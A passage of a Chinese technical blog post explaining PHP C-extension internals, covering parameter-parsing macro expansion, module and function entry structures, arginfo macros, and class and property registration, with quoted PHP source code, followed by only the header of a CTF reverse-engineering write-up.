class="type">const</span> <span class="type">int</span> _flags = (<span class="number">0</span>); \</span><br><span class="line">		<span class="type">uint32_t</span> _min_num_args = (<span class="number">0</span>); \</span><br><span class="line">		<span class="type">uint32_t</span> _max_num_args = (<span class="type">uint32_t</span>) (<span class="number">1</span>); \</span><br><span class="line">		<span class="type">uint32_t</span> _num_args = (execute_data)-&gt;This.u2.num_args; \</span><br><span class="line">		<span class="type">uint32_t</span> _i = <span class="number">0</span>; \</span><br><span class="line">		zval *_real_arg, *_arg = <span class="literal">NULL</span>; \</span><br><span class="line">		zend_expected_type _expected_type = Z_EXPECTED_LONG; \</span><br><span class="line">		<span class="type">char</span> *_error = <span class="literal">NULL</span>; \</span><br><span class="line">		<span class="type">bool</span> _dummy = <span class="number">0</span>; \</span><br><span class="line">		<span class="type">bool</span> _optional = <span class="number">0</span>; \</span><br><span class="line">		<span class="type">int</span> _error_code = ZPP_ERROR_OK; \</span><br><span class="line">		((<span class="type">void</span>)_i); \</span><br><span class="line">		((<span class="type">void</span>)_real_arg); \</span><br><span class="line">		((<span class="type">void</span>)_arg); \</span><br><span class="line">		((<span class="type">void</span>)_expected_type); \</span><br><span class="line">		((<span class="type">void</span>)_error); \</span><br><span class="line">		((<span class="type">void</span>)_optional); \</span><br><span class="line">		((<span class="type">void</span>)_dummy); \</span><br><span class="line">		\</span><br><span class="line">		<span class="keyword">do</span> &#123; \</span><br><span class="line">			<span class="keyword">if</span> (UNEXPECTED(_num_args &lt; _min_num_args) || \</span><br><span class="line">			    UNEXPECTED(_num_args &gt; _max_num_args)) &#123; \</span><br><span class="line">				<span class="keyword">if</span> (!(_flags &amp; ZEND_PARSE_PARAMS_QUIET)) &#123; \</span><br><span class="line">					zend_wrong_parameters_count_error(_min_num_args, _max_num_args); \</span><br><span class="line">				&#125; \</span><br><span class="line">				_error_code = ZPP_ERROR_FAILURE; \</span><br><span class="line">				<span class="keyword">break</span>; \</span><br><span class="line">			&#125; \</span><br><span class="line">			_real_arg = ZEND_CALL_VAR_NUM(execute_data, <span class="number">-1</span>);</span><br><span class="line"><span class="comment">// Z_PARAM_OPTIONAL</span></span><br><span class="line">      _optional = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// Z_PARAM_STRING</span></span><br><span class="line">      ++_i; \</span><br><span class="line">      ZEND_ASSERT(_i &lt;= _min_num_args || _optional==<span class="number">1</span>); \</span><br><span class="line">      ZEND_ASSERT(_i &gt;  _min_num_args || _optional==<span class="number">0</span>); \</span><br><span class="line">      <span class="keyword">if</span> (_optional) &#123; \</span><br><span class="line">        <span class="keyword">if</span> (UNEXPECTED(_i &gt;_num_args)) <span class="keyword">break</span>; \</span><br><span class="line">      &#125; \</span><br><span class="line">      _real_arg++; \</span><br><span class="line">      _arg = _real_arg; \</span><br><span class="line">      <span class="keyword">if</span> (UNEXPECTED(!zend_parse_arg_string(_arg, &amp;var, &amp;var_len, <span class="number">0</span>, _i))) &#123; \</span><br><span class="line">        _expected_type = <span class="number">0</span> ? Z_EXPECTED_STRING_OR_NULL : Z_EXPECTED_STRING; \</span><br><span class="line">        _error_code = ZPP_ERROR_WRONG_ARG; \</span><br><span class="line">        <span class="keyword">break</span>; \</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">// ZEND_PARSE_PARAMETERS_END</span></span><br><span class="line">      ZEND_ASSERT(_i == _max_num_args || _max_num_args == (<span class="type">uint32_t</span>) <span class="number">-1</span>); \</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="number">0</span>); \</span><br><span class="line">		<span class="keyword">if</span> (UNEXPECTED(_error_code != ZPP_ERROR_OK)) &#123; \</span><br><span class="line">			<span class="keyword">if</span> (!(_flags &amp; ZEND_PARSE_PARAMS_QUIET)) &#123; \</span><br><span class="line">				zend_wrong_parameter_error(_error_code, _i, _error, _expected_type, _arg); \</span><br><span class="line">			&#125; \</span><br><span class="line">			<span class="keyword">return</span>; \</span><br><span class="line">		&#125; \</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>由于C语言没有类的概念，因此对于一些需要泛型的操作只有通过宏定义实现才能让代码更加简洁，也提升了代码审计的难度。这段代码有一个比较有趣的地方——大量使用了<code>do ... while(0)</code>的控制流结构，这看上去冗余，但实际上是为了隔离作用域，让宏定义中的临时变量具有临时作用域，使宏定义调用方对于临时变量不可见，避免调用方多次调用相同宏定义时出现变量重复定义的问题。</p>
<p>在上面的代码中，关键逻辑实际上就是一行，即调用<code>zend_parse_arg_string</code>函数进行参数解析。前后添加了一些安全检查，包括参数个数、解析是否成功等。下面简单分析一下<code>zend_parse_arg_string</code>的相关逻辑。</p>
<h3 id="zend_parse_arg_string"><a class="markdownIt-Anchor" href="#zend_parse_arg_string"></a> <code>zend_parse_arg_string</code></h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_API.h, line 1984</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">bool</span> <span class="title function_">zend_parse_arg_str</span><span class="params">(zval *arg, zend_string **dest, <span class="type">bool</span> check_null, <span class="type">uint32_t</span> arg_num)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (EXPECTED(Z_TYPE_P(arg) == IS_STRING)) &#123;</span><br><span class="line">		*dest = Z_STR_P(arg);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (check_null &amp;&amp; Z_TYPE_P(arg) == IS_NULL) &#123;</span><br><span class="line">		*dest = <span class="literal">NULL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> zend_parse_arg_str_slow(arg, dest, arg_num);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">bool</span> <span class="title function_">zend_parse_arg_string</span><span class="params">(zval *arg, <span class="type">char</span> **dest, <span class="type">size_t</span> *dest_len, <span class="type">bool</span> check_null, <span class="type">uint32_t</span> arg_num)</span></span><br><span class="line">&#123;</span><br><span class="line">	zend_string *str;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!zend_parse_arg_str(arg, &amp;str, check_null, arg_num)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (check_null &amp;&amp; UNEXPECTED(!str)) &#123;</span><br><span class="line">		*dest = <span class="literal">NULL</span>;</span><br><span class="line">		*dest_len = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*dest = ZSTR_VAL(str);</span><br><span class="line">		*dest_len = ZSTR_LEN(str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以清晰地看到这里PHP源代码对传入的<code>zval</code>进行解析的过程。由于<code>zval</code>结构中的<code>zend_value</code>是一个联合类型，因此可以用于表示多种数据类型，相互转换也非常简单。</p>
<p>由此可知，<code>ZEND_PARSE_PARAMETERS_START</code>与<code>ZEND_PARSE_PARAMETERS_END</code>之间即为C库函数解析PHP参数的流程，在<code>ZEND_PARSE_PARAMETERS_START</code>中，需要指定要解析第几个参数，随后在内部可通过多次使用<code>Z_PARAM_xxx</code>进行参数解析。</p>
<h3 id="zend_module_entry"><a class="markdownIt-Anchor" href="#zend_module_entry"></a> <code>zend_module_entry</code></h3>
<p>这是一个在预先定义的C库文件中被使用的数据结构。从最上面的代码注释可以看到，这个数据类型定义了PHP模块的基本信息，包括扩展的名字、库函数的入口（定义的所有导出函数）、初始化函数、关闭函数、请求初始化函数、请求关闭函数、phpinfo钩子函数、版本等。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINFO_FUNCTION(hello_phpext)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;hello_phpext support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">zend_module_entry hello_phpext_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;hello_phpext&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	ext_functions,					<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(hello_phpext),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(hello_phpext),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLO_PHPEXT_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中，<code>PHP_MINFO</code>用于定义挂钩在phpinfo函数中的C库函数。它的作用是当PHP代码调用<code>phpinfo()</code>函数时显示PHP基本信息时，能够在其上附加显示本扩展的基本信息，包括扩展名、作者等。</p>
<ul>
<li><code>php_info_print_table_start</code>：开始显示phpinfo表格。</li>
<li><code>php_info_print_table_header</code>：输出表格头，第一个参数为需要添加的列数，后面的参数个数需要等于第一个参数的值，表示不同列的输出内容。</li>
<li><code>php_info_print_table_row</code>：输出表格内容，第一个参数为该行的列数，后面参数个数等于第一个参数的值，表示不同列的输出内容。</li>
<li><code>php_info_print_table_end</code>：结束输出phpinfo表格。</li>
</ul>
<p>对于下面的<code>PHP_MINFO_FUNCTION</code>定义，调用<code>phpinfo</code>后可看到下图表格的输出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINFO_FUNCTION(hello_phpext)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;hello_phpext support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_row(<span class="number">2</span>, <span class="string">&quot;author&quot;</span>, <span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="1.png" alt="" /></p>
<h3 id="zend_function_entry等"><a class="markdownIt-Anchor" href="#zend_function_entry等"></a> <code>zend_function_entry</code>等</h3>
<p>这是用于表示C库的导出PHP函数的结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_API.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_function_entry</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *fname;</span><br><span class="line">	zif_handler handler;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_arg_info</span> *<span class="title">arg_info</span>;</span></span><br><span class="line">	<span class="type">uint32_t</span> num_args;</span><br><span class="line">	<span class="type">uint32_t</span> flags;</span><br><span class="line">&#125; zend_function_entry;</span><br></pre></td></tr></table></figure>
<p>在<code>hello_phpext_arginfo.h</code>中，有一个<code>static const zend_function_entry ext_functions[]</code>的数组结构，其中即保存了本扩展中导出的，可在PHP代码中直接调用的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> zend_function_entry ext_functions[] = &#123;</span><br><span class="line">	ZEND_FE(test1, arginfo_test1)</span><br><span class="line">	ZEND_FE(test2, arginfo_test2)</span><br><span class="line">	ZEND_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中的每一个导出函数都使用<code>ZEND_FE</code>宏定义包裹，第一个参数为函数名，第二个参数为函数的参数信息。</p>
<p>头文件中也对参数类型进行了定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(arginfo_test1, <span class="number">0</span>, <span class="number">0</span>, IS_VOID, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(arginfo_test2, <span class="number">0</span>, <span class="number">0</span>, IS_STRING, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_TYPE_INFO_WITH_DEFAULT_VALUE(<span class="number">0</span>, str, IS_STRING, <span class="number">0</span>, <span class="string">&quot;\&quot;\&quot;&quot;</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br></pre></td></tr></table></figure>
<p>下面给出这些宏的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_API.h, line 183</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(name, return_reference, required_num_args, type, allow_null) \</span></span><br><span class="line"><span class="meta">	ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX2(name, return_reference, required_num_args, type, allow_null, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_API.h, line 179</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX2(name, return_reference, required_num_args, type, allow_null, is_tentative_return_type) \</span></span><br><span class="line"><span class="meta">	static const zend_internal_arg_info name[] = &#123; \</span></span><br><span class="line"><span class="meta">		&#123; (const char*)(zend_uintptr_t)(required_num_args), ZEND_TYPE_INIT_CODE(type, allow_null, _ZEND_ARG_INFO_FLAGS(return_reference, 0, is_tentative_return_type)), NULL &#125;,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Zend/zend_API.h, line 197</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_END_ARG_INFO()		&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Zend/zend_compile.h, line 400</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* arg_info for internal functions */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_arg_info</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	zend_type type;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *default_value;</span><br><span class="line">&#125; zend_internal_arg_info;</span><br></pre></td></tr></table></figure>
<p>因此，<code>ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(arginfo_test1, 0, 0, IS_VOID, 0)</code>展开就是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> zend_internal_arg_info arginfo_test1[] = &#123; \</span><br><span class="line">		&#123; (<span class="type">const</span> <span class="type">char</span>*)(<span class="type">zend_uintptr_t</span>)(<span class="number">0</span>), ZEND_TYPE_INIT_CODE(IS_VOID, <span class="number">0</span>, _ZEND_ARG_INFO_FLAGS(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)), <span class="literal">NULL</span> &#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中括号未闭合，用于在下面继续定义其他参数。这个宏定义实际上是首先定义了返回值的类型，它的5个参数分别代表：</p>
<ul>
<li>1 - 函数名</li>
<li>2 - 返回值是否为引用值</li>
<li>3 - 必需的参数数量</li>
<li>4 - 返回值类型</li>
<li>5 - 返回值是否允许为空</li>
</ul>
<p>这里需要注意的是，参数3表示必需的参数数量，在PHP函数中还可以添加一些可选参数。即即使传入的必需参数数量为0，在<code>ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX</code>之后依然可以定义任意多的可选参数。即使PHP代码中没有传入这些可选参数，在库函数中只是会被当成默认值看待，而不会直接报错。</p>
<p>其中，对于<code>ZEND_TYPE_INIT_CODE</code>的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TYPE_INIT_CODE(code, allow_null, extra_flags) \</span></span><br><span class="line"><span class="meta">	ZEND_TYPE_INIT_MASK(((code) == _IS_BOOL ? MAY_BE_BOOL : ((code) == IS_MIXED ? MAY_BE_ANY : (1 &lt;&lt; (code)))) \</span></span><br><span class="line"><span class="meta">		| ((allow_null) ? _ZEND_TYPE_NULLABLE_BIT : 0) | (extra_flags))</span></span><br></pre></td></tr></table></figure>
<p>它的3个参数分别代表数据类型、是否允许空、其他参数标志位。</p>
<p>在<code>ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX</code>之后，可以定义所有参数。定义使用下面的宏定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_ARG_TYPE_INFO(pass_by_ref, name, type_hint, allow_null) \</span></span><br><span class="line"><span class="meta">	&#123; #name, ZEND_TYPE_INIT_CODE(type_hint, allow_null, _ZEND_ARG_INFO_FLAGS(pass_by_ref, 0, 0)), NULL &#125;,</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_ARG_TYPE_INFO_WITH_DEFAULT_VALUE(pass_by_ref, name, type_hint, allow_null, default_value) \</span></span><br><span class="line"><span class="meta">	&#123; #name, ZEND_TYPE_INIT_CODE(type_hint, allow_null, _ZEND_ARG_INFO_FLAGS(pass_by_ref, 0, 0)), default_value &#125;,</span></span><br></pre></td></tr></table></figure>
<p><code>type_hint</code>即为参数的数据类型，<code>pass_by_ref</code>表示是否传入引用。</p>
<h3 id="php类相关"><a class="markdownIt-Anchor" href="#php类相关"></a> PHP类相关</h3>
<p>在C语言的PHP扩展中，可以完成对PHP类的定义，包括类属性、类方法的定义等。这里以PHP源码为例。</p>
<p>在<code>/ext/com_dotnet/com_persist_arginfo.h</code>中，C代码定义了一个<code>COMPersistHelper</code>类。要想让这个类在PHP代码中能够直接使用，需要一个类注册函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ext/com_dotnet/com_persist_arginfo.h, line 56</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_class_entry *<span class="title function_">register_class_COMPersistHelper</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	zend_class_entry ce, *class_entry;</span><br><span class="line"></span><br><span class="line">	INIT_CLASS_ENTRY(ce, <span class="string">&quot;COMPersistHelper&quot;</span>, class_COMPersistHelper_methods);</span><br><span class="line">	class_entry = zend_register_internal_class_ex(&amp;ce, <span class="literal">NULL</span>);</span><br><span class="line">	class_entry-&gt;ce_flags |= ZEND_ACC_FINAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> class_entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类注册代码具有固定的函数声明格式，其必为静态函数，返回值必为<code>zend_class_entry*</code>，函数名应被命名为<code>register_class_xxx</code>，无参。</p>
<p>在函数中，必需进行类的初始化，即调用<code>INIT_CLASS_ENTRY</code>宏，这个宏的第一个参数固定，第二个参数为类名，第三个参数为定义类中方法的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ext/com_dotnet/com_persist_arginfo.h, line 44</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> zend_function_entry class_COMPersistHelper_methods[] = &#123;</span><br><span class="line">	ZEND_ME(COMPersistHelper, __construct, arginfo_class_COMPersistHelper___construct, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, GetCurFileName, arginfo_class_COMPersistHelper_GetCurFileName, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, SaveToFile, arginfo_class_COMPersistHelper_SaveToFile, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, LoadFromFile, arginfo_class_COMPersistHelper_LoadFromFile, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, GetMaxStreamSize, arginfo_class_COMPersistHelper_GetMaxStreamSize, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, InitNew, arginfo_class_COMPersistHelper_InitNew, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, LoadFromStream, arginfo_class_COMPersistHelper_LoadFromStream, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_ME(COMPersistHelper, SaveToStream, arginfo_class_COMPersistHelper_SaveToStream, ZEND_ACC_PUBLIC)</span><br><span class="line">	ZEND_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>若需要定义类中的方法，只需要完成对这个数组的定义即可，数组应命名为<code>class_xxx_methods</code>，数组中需要使用<code>ZEND_ME</code>宏表示类方法项。这个宏各个参数的含义如下：</p>
<ul>
<li>1 - 类名，不加引号。</li>
<li>2 - 方法名，前加<code>__</code>的是内置函数，如构造函数、setter、getter等。</li>
<li>3 - 方法的参数定义，与函数参数定义方式相同。</li>
<li>4 - 类访问权限，如<code>ZEND_ACC_PUBLIC</code>指<code>public</code>访问权限等。</li>
</ul>
<p>如果需要定义类属性，则需在类注册函数中完成定义。下面是PHP类<code>DOMDocumentType</code>类的注册函数的一部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ext/dom/php_dom_arginfo.h, line 905</span></span><br><span class="line"></span><br><span class="line">	zval property_name_default_value;</span><br><span class="line">	ZVAL_UNDEF(&amp;property_name_default_value);</span><br><span class="line">	zend_string *property_name_name = zend_string_init(<span class="string">&quot;name&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;name&quot;</span>) - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	zend_declare_typed_property(class_entry, property_name_name, &amp;property_name_default_value, ZEND_ACC_PUBLIC, <span class="literal">NULL</span>, (zend_type) ZEND_TYPE_INIT_MASK(MAY_BE_STRING));</span><br><span class="line">	zend_string_release(property_name_name);</span><br></pre></td></tr></table></figure>
<p>在上面的代码中，为类<code>DOMDocumentType</code>定义了一个属性，名为<code>name</code>，这里是使用<code>zend_string_init</code>定义字符串，前两个参数分别为<code>char*</code>和长度，第3个长度指是否为永久字符串。随后，通过<code>zend_declare_typed_property</code>正式将属性添加到类中，参数列表如下：</p>
<ul>
<li>1 - 注册函数的参数</li>
<li>2 - 属性名</li>
<li>3 - 默认值</li>
<li>4 - 访问权限</li>
<li>5 - 文档字符串</li>
<li>6 - 属性类型</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ext/dom/php_dom_arginfo.h, line 911</span></span><br><span class="line"></span><br><span class="line">	zend_string *property_entities_class_DOMNamedNodeMap = zend_string_init(<span class="string">&quot;DOMNamedNodeMap&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;DOMNamedNodeMap&quot;</span>)<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">	zval property_entities_default_value;</span><br><span class="line">	ZVAL_UNDEF(&amp;property_entities_default_value);</span><br><span class="line">	zend_string *property_entities_name = zend_string_init(<span class="string">&quot;entities&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;entities&quot;</span>) - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	zend_declare_typed_property(class_entry, property_entities_name, &amp;property_entities_default_value, ZEND_ACC_PUBLIC, <span class="literal">NULL</span>, (zend_type) ZEND_TYPE_INIT_CLASS(property_entities_class_DOMNamedNodeMap, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	zend_string_release(property_entities_name);</span><br></pre></td></tr></table></figure>
<p>上面的代码定义了数据类型为类的类属性，这里是定义一个<code>DOMNamedNodeMap</code>类型的类属性，需要使用<code>ZEND_TYPE_INIT_CLASS</code>宏定义。最后的<code>zend_string_release</code>即释放字符串值。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/04/03/buuctf-reverse-write-ups-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/03/buuctf-reverse-write-ups-2/" class="post-title-link" itemprop="url">buuctf-reverse write-ups (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-03 00:37:11" itemprop="dateCreated datePublished" datetime="2024-04-03T00:37:11+08:00">2024-04-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-30 08:53:42" itemprop="dateModified" datetime="2024-05-30T08:53:42+08:00">2024-05-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
